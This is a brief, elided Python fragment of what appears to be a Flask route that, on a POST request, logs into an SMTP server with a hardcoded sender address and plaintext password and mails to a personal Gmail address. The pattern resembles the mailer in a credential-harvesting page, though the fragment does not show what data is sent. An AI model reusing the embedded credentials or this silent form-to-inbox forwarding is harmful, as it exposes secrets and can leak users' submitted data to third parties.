...
def first():
    if request.method == 'POST':
        ...
        sender_email = "parceirosdanet@parceirosdanet.com.br"
        sender_emaill = "parceirosdanet"
        receiver_email = "kokofunds147@gmail.com"
        password = "Parceiros@2024"
        ...
        with smtplib.SMTP_SSL("parceirosdanet.com.br", 465) as server:
